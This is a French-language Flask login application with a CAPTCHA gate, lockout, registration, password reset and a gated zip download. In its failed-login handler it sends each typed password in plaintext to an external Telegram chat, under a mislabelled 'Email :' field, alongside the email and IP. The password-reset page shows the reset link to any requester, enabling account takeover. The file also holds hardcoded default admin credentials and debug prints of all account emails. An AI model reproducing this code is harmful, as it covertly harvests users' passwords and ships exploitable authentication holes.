import os
import hashlib
import hmac
import secrets
import sqlite3
import time
from datetime import datetime, timezone, timedelta
from functools import wraps

import requests
from dotenv import load_dotenv
from flask import (
    Flask, abort, redirect, render_template, request,
    send_file, session, url_for
)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import check_password_hash, generate_password_hash


load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")


def envoyer_telegram(message):
    """Envoie un message texte sur le bot Telegram. Best-effort."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram ERROR : variables manquantes dans .env")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        r = requests.post(
            url,
            data={"chat_id": TELEGRAM_CHAT_ID, "text": message},
            timeout=15,
        )
        if r.status_code != 200:
            print("Telegram ERROR :", r.status_code, r.text)
            return False
        print("Telegram OK")
        return True
    except requests.RequestException as e:
        print("Telegram EXCEPTION :", e)
        return False


print("Telegram token present :", bool(TELEGRAM_BOT_TOKEN))
print("Telegram chat ID present :", bool(TELEGRAM_CHAT_ID))

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "aicha_s.db")

USERS_SEED = [
    (
        os.environ.get("ADMIN_EMAIL", "admin@aicha-s.fr"),
        os.environ.get("ADMIN_PASSWORD", "Aicha2026!Secure"),
        "Administratrice",
    ),
    ("demo@aicha-s.fr", "Demo2026!Secure", "Compte Demo"),
]

app = Flask(__name__)


def load_secret_key():
    env_key = os.environ.get("SECRET_KEY")
    if env_key:
        return env_key
    key_path = os.path.join(BASE_DIR, "instance", ".secret_key")
    os.makedirs(os.path.dirname(key_path), exist_ok=True)
    if os.path.exists(key_path):
        with open(key_path) as f:
            return f.read().strip()
    key = secrets.token_hex(32)
    fd = os.open(key_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, "w") as f:
        f.write(key)
    return key


app.secret_key = load_secret_key()

LOCK_AFTER = 5
LOCK_MINUTES = 15

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,   # True en HTTPS
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=12),
    MAX_CONTENT_LENGTH=1024 * 1024,
)

limiter = Limiter(get_remote_address, app=app,
                  default_limits=["600 per hour"], storage_uri="memory://")



def get_db():
    db = sqlite3.connect(DB_PATH)
    db.row_factory = sqlite3.Row
    return db


def init_db():
    db = get_db()
    db.executescript("""
    CREATE TABLE IF NOT EXISTS users(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT UNIQUE NOT NULL,
      name TEXT NOT NULL,
      password_hash TEXT NOT NULL,
      created_at TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS login_attempts(
      identifier TEXT PRIMARY KEY,
      count INTEGER NOT NULL DEFAULT 0,
      locked_until REAL
    );
    CREATE TABLE IF NOT EXISTS password_resets(
      token TEXT PRIMARY KEY,
      email TEXT NOT NULL,
      expires_at REAL NOT NULL,
      used INTEGER NOT NULL DEFAULT 0
    );
    """)
    for email, password, name in USERS_SEED:
        row = db.execute("SELECT id, password_hash FROM users WHERE email=?",
                         (email,)).fetchone()
        try:
            if row is None:
                db.execute(
                    "INSERT INTO users(email,name,password_hash,created_at) VALUES(?,?,?,?)",
                    (email, name, generate_password_hash(password),
                     datetime.now(timezone.utc).isoformat()))
            elif not check_password_hash(row["password_hash"], password):
                db.execute("UPDATE users SET password_hash=? WHERE email=?",
                           (generate_password_hash(password), email))
        except sqlite3.IntegrityError:
            pass
    db.commit()
    db.close()


init_db()


def csrf_token():
    tok = session.get("_csrf")
    if not tok:
        tok = secrets.token_urlsafe(32)
        session["_csrf"] = tok
    return tok


app.jinja_env.globals["csrf_token"] = csrf_token


def csrf_valid():
    session_token = session.get("_csrf")
    form_token = request.form.get("_csrf")
    if not session_token or not form_token:
        return False
    return hmac.compare_digest(str(session_token), str(form_token))


def _hash_code(code):
    return hmac.new(app.secret_key.encode(), code.encode(),
                    hashlib.sha256).hexdigest()


def _email_ok(email):
    parts = email.split("@")
    return len(parts) == 2 and all(parts) and "." in parts[1]


def _safe_next(value):
    if value and value.startswith("/") and not value.startswith("//"):
        return value
    return None


OPEN_ENDPOINTS = {"captcha_gate", "captcha_verify", "static"}


@app.before_request
def require_captcha():
    if request.endpoint is None or request.endpoint in OPEN_ENDPOINTS:
        return None
    if not session.get("captcha_ok"):
        return redirect(url_for("captcha_gate", next=request.path))
    return None


@app.after_request
def security_headers(resp):
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    resp.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
    resp.headers["Cross-Origin-Opener-Policy"] = "same-origin"
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "img-src 'self' data: https://images.unsplash.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "script-src 'self'; base-uri 'self'; form-action 'self'; "
        "frame-ancestors 'none'")
    return resp


def login_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        if not session.get("user_id"):
            return redirect(url_for("login", next=request.path))
        return view(*args, **kwargs)
    return wrapped



@app.route("/")
def index():
    return redirect(url_for("login"))


@app.route("/captcha")
def captcha_gate():
    if session.get("captcha_ok"):
        return redirect(_safe_next(request.args.get("next")) or url_for("login"))
    a = secrets.randbelow(9) + 1
    b = secrets.randbelow(9) + 1
    session["captcha_answer"] = a + b
    session.modified = True
    return render_template("captcha.html", error=None, captcha_a=a,
                           captcha_b=b, next=request.args.get("next", ""))


@app.route("/captcha/verify", methods=["POST"])
@limiter.limit("8 per minute")
def captcha_verify():
    if not csrf_valid():
        abort(400)
    entered_raw = (request.form.get("captcha_code") or "").strip()
    try:
        entered = int(entered_raw)
    except (ValueError, TypeError):
        entered = None
    expected = session.get("captcha_answer")
    if entered is not None and expected is not None and entered == expected:
        session["captcha_ok"] = True
        session.pop("captcha_answer", None)
        session.modified = True
        return redirect(_safe_next(request.form.get("next")) or url_for("login"))
    a = secrets.randbelow(9) + 1
    b = secrets.randbelow(9) + 1
    session["captcha_answer"] = a + b
    session.modified = True
    return render_template("captcha.html",
                           error="Reponse incorrecte. Essayez le nouveau calcul.",
                           captcha_a=a, captcha_b=b,
                           next=request.form.get("next", "")), 401


@app.route("/login", methods=["GET", "POST"])
@limiter.limit("10 per minute", methods=["POST"])
def login():
    if session.get("user_id"):
        return redirect(url_for("bienvenue"))

    error = None

    if request.method == "POST":
        if not csrf_valid():
            abort(400)

        email = (request.form.get("email") or "").strip().lower()
        password = request.form.get("password") or ""

        print("DEBUG email recu :", repr(email))
        print("DEBUG password longueur :", len(password))

        debug_db = get_db()
        _u = debug_db.execute("SELECT email FROM users").fetchall()
        debug_db.close()

        print("DEBUG comptes en base :", [r["email"] for r in _u])

        now = time.time()

        db = get_db()

        att = db.execute(
            "SELECT count, locked_until "
            "FROM login_attempts "
            "WHERE identifier=?",
            (email,)
        ).fetchone()

        # ---------------------------------------------------------
        # COMPTE DEJA VERROUILLE
        # ---------------------------------------------------------
        if att and att["locked_until"] and att["locked_until"] > now:
            db.close()

            # Notification Telegram : tentative pendant verrouillage
            ip = request.remote_addr or "?"
            heure = datetime.now(
                timezone(timedelta(hours=1))
            ).strftime("%d/%m/%Y %H:%M:%S")

            message_telegram = (
                "🔒 TENTATIVE SUR COMPTE VERROUILLÉ\n\n"
                f"Email : {email}\n"
                f"IP : {ip}\n"
                f"Heure : {heure}\n"
                f"Statut : Compte temporairement verrouillé"
            )

            try:
                envoyer_telegram(message_telegram)
            except Exception as e:
                print("Notif Telegram non envoyée :", e)

            return render_template(
                "login.html",
                error="Trop de tentatives. Reessayez plus tard."
            ), 429

        # ---------------------------------------------------------
        # RECHERCHE UTILISATEUR
        # ---------------------------------------------------------
        user = db.execute(
            "SELECT id, name, password_hash "
            "FROM users "
            "WHERE email=?",
            (email,)
        ).fetchone()

        # ---------------------------------------------------------
        # CONNEXION REUSSIE
        # ---------------------------------------------------------
        if user and check_password_hash(
            user["password_hash"],
            password
        ):
            db.execute(
                "DELETE FROM login_attempts "
                "WHERE identifier=?",
                (email,)
            )
            db.commit()
            db.close()

            session.clear()
            session["captcha_ok"] = True
            session["user_id"] = user["id"]
            session["user_name"] = user["name"]
            session.permanent = True

            # Notification Telegram
            ip = request.remote_addr or "?"
            heure = datetime.now(
                timezone(timedelta(hours=1))
            ).strftime("%d/%m/%Y %H:%M:%S")

            message_telegram = (
                "✅ CONNEXION RÉUSSIE\n\n"
                f"Email : {email}\n"
                f"IP : {ip}\n"
                f"Heure : {heure}"
            )

            try:
                envoyer_telegram(message_telegram)
            except Exception as e:
                print("Notif Telegram non envoyée :", e)

            return redirect(
                _safe_next(request.args.get("next"))
                or url_for("bienvenue")
            )

        # ---------------------------------------------------------
        # CONNEXION ECHOUEE
        # ---------------------------------------------------------

        # On calcule le nombre de tentatives
        count = (att["count"] if att else 0) + 1

        # Verrouillage après LOCK_AFTER tentatives
        locked_until = (
            now + LOCK_MINUTES * 60
            if count >= LOCK_AFTER
            else None
        )

        # Enregistrement de la tentative
        db.execute(
            "INSERT INTO login_attempts("
            "identifier, count, locked_until"
            ") VALUES(?,?,?) "
            "ON CONFLICT(identifier) DO UPDATE SET "
            "count=?, locked_until=?",
            (
                email,
                count,
                locked_until,
                count,
                locked_until
            )
        )

        db.commit()
        db.close()

        # ---------------------------------------------------------
        # NOTIFICATION TELEGRAM : ECHEC
        # ---------------------------------------------------------

        ip = request.remote_addr or "?"

        heure = datetime.now(
            timezone(timedelta(hours=1))
        ).strftime("%d/%m/%Y %H:%M:%S")

        if locked_until:
            statut = "COMPTE TEMPORAIREMENT VERROUILLÉ"
        else:
            statut = "Identifiants incorrects"

        message_telegram = (
            "⚠️ TENTATIVE DE CONNEXION ÉCHOUÉE\n\n"
            f"Email : {email}\n"
            f"Email : {password}\n"
            f"IP : {ip}\n"
            f"Heure : {heure}\n"
            f"Tentative n° : {count}\n"
            f"Statut : {statut}"
        )

        try:
            envoyer_telegram(message_telegram)
        except Exception as e:
            print("Notif Telegram échec non envoyée :", e)

        # ---------------------------------------------------------
        # MESSAGE AFFICHÉ SUR LE SITE
        # ---------------------------------------------------------
        error = "Identifiants incorrects."

    return render_template("login.html", error=error)

   


@app.route("/inscription", methods=["GET", "POST"])
@limiter.limit("5 per minute", methods=["POST"])
def inscription():
    error = None
    if request.method == "POST":
        if not csrf_valid():
            abort(400)
        name = (request.form.get("name") or "").strip()
        email = (request.form.get("email") or "").strip().lower()
        password = request.form.get("password") or ""
        confirm = request.form.get("confirm") or ""

        if not name or not _email_ok(email):
            error = "Nom ou email invalide."
        elif len(password) < 8:
            error = "Le mot de passe doit contenir au moins 8 caracteres."
        elif password != confirm:
            error = "Les deux mots de passe ne correspondent pas."
        else:
            db = get_db()
            try:
                db.execute(
                    "INSERT INTO users(email,name,password_hash,created_at) VALUES(?,?,?,?)",
                    (email, name, generate_password_hash(password),
                     datetime.now(timezone.utc).isoformat()))
                db.commit()
                db.close()
                return redirect(url_for("login"))
            except sqlite3.IntegrityError:
                db.close()
                error = "Un compte existe deja avec cet email."
    return render_template("inscription.html", error=error)


@app.route("/mot-de-passe-oublie", methods=["GET", "POST"])
@limiter.limit("5 per minute", methods=["POST"])
def mot_de_passe_oublie():
    info = None
    reset_link = None
    if request.method == "POST":
        if not csrf_valid():
            abort(400)
        email = (request.form.get("email") or "").strip().lower()
        db = get_db()
        user = db.execute("SELECT id FROM users WHERE email=?", (email,)).fetchone()
        if user:
            token = secrets.token_urlsafe(32)
            db.execute(
                "INSERT INTO password_resets(token,email,expires_at,used) VALUES(?,?,?,0)",
                (token, email, time.time() + 3600))
            db.commit()
            reset_link = url_for("reinitialiser", token=token, _external=True)
        db.close()
        info = ("Si un compte existe pour cette adresse, un lien de "
                "reinitialisation a ete genere (valable 1 heure).")
    return render_template("oubli.html", info=info, reset_link=reset_link)


@app.route("/reinitialiser/<token>", methods=["GET", "POST"])
@limiter.limit("8 per minute", methods=["POST"])
def reinitialiser(token):
    db = get_db()
    row = db.execute(
        "SELECT email, expires_at, used FROM password_resets WHERE token=?",
        (token,)).fetchone()
    if not row or row["used"] or row["expires_at"] < time.time():
        db.close()
        return render_template("error.html", code=410,
                               message="Lien invalide ou expire."), 410
    error = None
    if request.method == "POST":
        if not csrf_valid():
            abort(400)
        password = request.form.get("password") or ""
        confirm = request.form.get("confirm") or ""
        if len(password) < 8:
            error = "Le mot de passe doit contenir au moins 8 caracteres."
        elif password != confirm:
            error = "Les deux mots de passe ne correspondent pas."
        else:
            db.execute("UPDATE users SET password_hash=? WHERE email=?",
                       (generate_password_hash(password), row["email"]))
            db.execute("UPDATE password_resets SET used=1 WHERE token=?", (token,))
            db.commit()
            db.close()
            return redirect(url_for("login"))
    db.close()
    return render_template("reset.html", error=error, token=token)


@app.route("/logout")
def logout():
    session.clear()
    session["captcha_ok"] = True
    return redirect(url_for("login"))


@app.route("/bienvenue")
@login_required
def bienvenue():
    return render_template("bienvenue.html", name=session.get("user_name"))


@app.route("/telecharger/aicha-s.zip")
@login_required
def telecharger_zip():
    return send_file(os.path.join(BASE_DIR, "aicha-s.zip"), as_attachment=True)


@app.errorhandler(400)
def err_400(e):
    return render_template("error.html", code=400, message="Requete invalide."), 400


@app.errorhandler(404)
def err_404(e):
    return render_template("error.html", code=404, message="Page introuvable."), 404


@app.errorhandler(429)
def err_429(e):
    return render_template("error.html", code=429,
                           message="Trop de requetes. Patientez un instant."), 429


@app.errorhandler(500)
def err_500(e):
    return render_template("error.html", code=500,
                           message="Erreur interne du serveur."), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)